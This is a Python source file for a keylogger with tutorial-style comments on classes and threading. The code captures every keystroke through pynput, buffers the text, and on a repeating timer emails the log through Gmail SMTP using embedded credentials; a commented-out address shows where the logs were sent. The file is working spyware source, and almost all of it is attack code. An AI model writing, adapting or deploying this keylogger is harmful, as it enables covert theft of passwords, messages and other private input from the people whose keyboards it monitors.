#!/usr/bin/env python
import pynput.keyboard, threading, smtplib, ssl
# Threading introduces a parallel process, a process
# or a function that runs on a separate thread, independent
# from the main one

class Keylogger:
  # Functions inside classes are called methods
  # We invoke methods on the class once we create an object of the class
  # any methods that we define inside any class, the first argument
  # that needs to be passed is 'self'. Everytime we use a method that
  # is defined within our class we add 'self.' in fron of it, like
  # "self.report()"

  def __init__(self, time_interval, email, password):
    # Whatever code we put in the constructor method (which we initialize
    # using init) will be executed automatically as soon as an object based
    # on the class is created - ex. my_keylogger = zlogger.Keylogger
    self.log = "Keylogger started" 
    self.interval = time_interval
    self.from_email = email
    self.from_password = password

  def append_to_log(self, string):  
    self.log = self.log + string

  def key_press(self, key):
    try:
      current_key = str(key.char)
    except AttributeError:
      if key == key.space:
        current_key = " "
      else:
        current_key = " " + str(key) + " "
    
    self.append_to_log(current_key)

  def report(self):
    self.send_mail(self.from_email, self.from_password, "\n\n" + self.log)
    self.log = ""
    timer = threading.Timer(self.interval, self.report)
    # After the timer starts, wait for 10 seconds and call
    # the same function (starts over again). This is a recursive
    # function (a function that calls itself)
    timer.start()

  def send_mail(self, from_email, from_password, message):
    # Send log to this address
    to_email = from_email  # 'saveriomattolisurvey@gmail.com'

    # Set up a secure SMTP server connection
    print('Connecting...')
    try:
      with smtplib.SMTP_SSL("smtp.gmail.com", 587, context=ssl.create_default_context()) as server:
        print('Connected!')
        try:
            # log in to gmail account
            print('Logging in...')
            server.login(from_email, from_password)
            print('Logged in!')
            try:
                # Send message
                print('Sending mail...')
                server.sendmail(from_email, to_email, message)
                print('Mail sent!')
            except Exception as send_ex: # Full exception list - https://docs.python.org/3/library/smtplib.html#smtplib.SMTP.sendmail
                print('sendmail failed - try again')
                # print(send_ex)
        except Exception as login_ex: # Full exception list - https://docs.python.org/3/library/smtplib.html#smtplib.SMTP.login
            print('login failed - try again')
            # print(login_ex)
        finally:
          server.quit()
    except Exception as connect_ex:
      print('connection failed - try again')
      # print(connect_ex)


  def start(self):
    keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
    with keyboard_listener:
      self.report()
      # Because the timer is running on a separate thread, it will
      # not block or interrupt the execution of the listener
      keyboard_listener.join()


